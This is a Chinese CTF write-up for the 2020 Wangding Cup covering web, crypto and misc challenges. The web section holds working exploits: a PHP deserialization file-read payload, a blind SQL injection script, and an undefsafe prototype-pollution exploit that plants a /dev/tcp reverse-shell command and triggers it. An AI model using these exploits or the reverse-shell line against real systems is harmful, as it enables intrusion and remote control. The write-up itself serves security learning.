---
title: 2020 网鼎杯青龙组部分题解
tags:
  - Writeup
  - CTF
  - PHP
  - JavaScript
date: 2020-05-11 16:57:08
---

## Web

### AreUSerialz

题目源码如下：

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();   
    }

    public function process() {
        if($this->op == "1") {
            $this->write();       
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

POP 链构造: __destruct() -> process() -> read() (op = 2) -> file_get_contents().

Bypass：

  - op 弱类型比较

  ```php
  if($this->op === "2")
      $this->op = "1";
  ```
  可通过设置 op = 2 即可绕过，即松散比较 2 == \'2\' 为 True.

  - is_valid() 绕过

  ```php
  function is_valid($s) {
      for($i = 0; $i < strlen($s); $i++)
          if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
              return false;
      return true;
  }
  ```
  > PHP 序列化时 private 和 protected 变量会引入不可见字符 `\x00`（Ascii 码为 0 的不可见字符），输出和复制的时候可能会遗漏这些信息，导致反序列化的时候出错。
  > 我们可以在序列化内容时使用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，比如：s:5:\"A\<null_byte\>B\<cr\>\<lf\>\" -> S:5:"A\00B\09\0D"

  is_valid() 函数过滤了 Payload 中 Protect 属性序列化后产生的 `%00*%00`，经测试**在 PHP 7 + 的版本中，反序列化时会忽略成员的访问属性**。即可以通过序列化 public 属性的字符串来反序列化生成对应 protected 属性的对象。
  ```php
  <?php

  class Foo {
      protected $op;
      protected $file;
  }

  $payload = 'O:3:"Foo":2:{s:2:"op";s:1:"2";s:4:"file";s:8:"flag.php";}';

  var_dump(unserialize($payload));
  /*object(Foo)#1 (2) {
    ["op":protected]=>
    string(1) "2"
    ["file":protected]=>
    string(8) "flag.php"
  }*/
  ```

exploit:

```php
<?php

class FileHandler {
    public $op = 2;
    public $filename = "php://filter/convert.base64-encode/resource=/web/html/flag.php";
    public $content;
}

$x = new FileHandler();
$ser =  serialize($x);
echo $ser."\n";
echo urlencode($ser);
```

通过读取进程信息获取 flag 绝对路径：


```php
/proc/self/cmdline: /usr/sbin/httpd.-DNO_DETACH.-f./web/config/httpd.conf.
/web/config/httpd.conf: ServerRoot /web
/web/html/flag.php: flag
```

Payload:

```php
'O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:62:"php://filter/convert.base64-encode/resource=/web/html/flag.php";s:7:"content";N;}';
```

获取到 flag.php 内容如下：

```php
//PD9waHAKCiRmbGFnID0gImZsYWd7NTJhZTU3MzMtMzVhMy00NjRhLWE0NzQtODAyY2IzMmM0MDAzfSI7Cg==
<?php
$flag = "flag{52ae5733-35a3-464a-a474-802cb32c4003}";
```

### trace

MySQL 5.5.62（无 sys 表）注入，过滤了 information_schema，同时 SQL 语句执行成功 20 次后容器作废。

fuzz 发现 flag 位于 flag 表中，可通过无列名注入获取数据，同时保证 SQL 语句执行永不成功即可：

~~~
if((), sleep(3) - exp(~1), exp(~1))
~~~

exploit:

```py
# -*- coding:utf8 -*-

import requests as r

url = 'http://xxx.changame.ichunqiu.com/register_do.php'

payload = "select database()" #ctf  # 5.5.62-
payload = '(select `2` from (select 1,2 union select * from flag)a limit 1,1)'
param = "a'|if(ascii(mid((%s),%d,1))%c%d,sleep(3) - exp(~1),exp(~1)),'admin123')#"

def check(data):
    try:
        res = r.post(url, data=data, timeout=3)
        print(res.text)
    except:
        return True
    return False

def binSearch(payload):
    print('[*]' + payload)
    result = 'flag{'
    for i in range(6, 100):
        left = 33
        right = 127
        #binary search
        while left <= right:
            mid = (left + right) // 2
            #s = payload % (i, '=', mid)
            data = {
                "username": param % (payload, i, '=', mid),
                'password': '123',
            }
            print(mid)
            if check(data) == True:
                result += chr(mid)
                print(result)
                break
            else:
                # s = payload % (i, '>', mid)
                data = {
                    "username": param % (payload, i, '>', mid),
                    'password': '123',
                }
                if check(data):
                    left = mid + 1
                else:
                    right = mid - 1
        if left > right:
            break
    return result

if __name__ == "__main__":
    res = binSearch(payload)
    print(res)
```

### notes

app.js 源码如下:

```js
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) { 
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
```

路由 `/status` 中通过 exec() 执行系统命令，可通过原型链污染 commands 字典的原型进行 RCE。

```js
app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })
```

undersafe 2.0.2 版本中存在原型链污染漏洞：https://snyk.io/test/npm/undefsafe/2.0.2

```js
var a = require("undefsafe");
var payload = "__proto__.toString";
a({},payload,"JHU");
console.log({}.toString);
```

本地测试如下：

```js
PS C:\Users\MS> node
> var note_list = {'key1':'value1'};
undefined
> var undefsafe = require("undefsafe");
undefined
> var payload = "__proto__.author";
undefined
> undefsafe(note_list, payload, "reverse_shell_payload");
undefined
> console.log(note_list.author)
reverse_shell_payload
undefined
> console.log({}.author)
reverse_shell_payload
undefined
> console.log({}.__proto__.author)
reverse_shell_payload
undefined
> commands = {'s1':'s1_val', 's2':'s2_val'}
{ s1: 's1_val', s2: 's2_val' }
> commands
{ s1: 's1_val', s2: 's2_val' }
> for(let index in commands) { console.log(index, commands[index]); }
s1 s1_val
s2 s2_val
author reverse_shell_payload
undefined
> note_list.__proto__
{ author: 'reverse_shell_payload' }
```

可在 `/edit_note` 中 edit_note() 函数执行 undefsafe 进行触发：

```js
edit_note(id, author, raw) { 
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }
```

exploit:

```py
import requests

r = requests.Session()
url = 'http://xxx.cloudgame2.ichunqiu.com:8080'

r.post(url + '/edit_note', data={
      'id': '__proto__',
      'author': '/bin/bash -i >&/dev/tcp/IP/7777 0>&1',
      'raw': 'xxx',
  })
#print(r.status_code, r.text)
r.get(url + '/status')
#print(r.status_code, r.text)
```

## Crypto

### you raise me up

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Crypto.Util.number import *
import random

n = 2 ** 512
m = random.randint(2, n-1) | 1
c = pow(m, bytes_to_long(flag), n)
print 'm = ' + str(m)
print 'c = ' + str(c)

# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075
# c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499
```

已知 n, m, c 以及 c = pow(m, bytes_to_long(flag), n)，直接通过 Sage Math 求离散对数 discrete_log(c, m) 即 c 以 m 为底的对数 flag 即可。

```python
# Sage Math
m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075
c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499
n = 2**512
m = Mod(m, n)
c = Mod(c, n)
discrete_log(c, m)
#56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757
```

```python
# -*- coding: utf-8 -*-
from Crypto.Util.number import *
flag = 56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757
print long_to_bytes(flag)
# flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}
```

### boom

en5oy

[[x == 74, y == 68, z == 31]]

89127561


## Misc

### 战队猜猜猜

在 /static/index.js 中发现关键代码如下：

```js
if (a.currentLevel > a.maxLevel) {
	var IAvaDcnZ1=prompt("please input your team Token:")['trim']();
	$.ajax({url:'flag.php',type:'POST',data:'token='+IAvaDcnZ1,success:function(StRvT3){var StRvT3=StRvT3;console[log](StRvT3)\}\})
	window["alert"]("恭喜你得到flag了，去寻找吧~！");
	a.fire("gameEnd");
    return;
}
```

POST /flag.php Team Token 即可获取 flag.













